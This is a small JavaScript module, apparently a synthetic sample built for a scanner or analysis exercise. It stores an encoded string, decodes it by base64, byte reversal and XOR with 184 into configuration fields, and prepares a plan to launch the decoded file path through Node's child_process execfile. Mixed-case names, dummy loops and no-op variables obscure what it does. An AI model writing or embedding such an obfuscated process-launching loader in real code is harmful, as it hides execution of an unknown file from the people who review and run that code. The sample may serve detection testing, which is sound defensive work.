const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_4ed67e77 = "y9LVltmBjYuK3trb24CIiJXd39nMy5aX3dzX1pXLy93KzNbN0JfI1cyXhdDM2cjn3dTR3sSK/vr7+4CIiJX9/Pf2hdzR59bf0dnI1dnbxImFzNbN19vn3d/ZzMvE3dzX1ufd1NHe293A3YXK3czI2dzZxMvL3dvXysjn0NvM2cjL0dyU1Nnb19Tn3czZ29fUhcvI3czLxImFzg==";
const Codec_4ed67e77 = "base64_literal|reverse_then_xor|b8";

function load_4ed67e77() { return [...Buffer.from(Material_4ed67e77, "base64")]; }
function decode_4ed67e77(EnCoDeD) { return [...EnCoDeD].reverse().map((value) => value ^ 184); }
async function recover_4ed67e77() {
  const [NeUtRaL] = ["compass"];
  const EnCoDeD = load_4ed67e77(); let DeCoDeD = [];
  for (const PaSs of [1]) DeCoDeD = decode_4ed67e77(EnCoDeD);
  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
}
async function inspect_4ed67e77() { return JSON.parse(JSON.stringify({ value: await recover_4ed67e77() })).value; }
async function plan_4ed67e77() { const inspect = inspect_4ed67e77; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "execfile_node", path: fields.file_path, module: "node:child_process" }); }
void moduleShape; void plan_4ed67e77;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_4ed67e77());
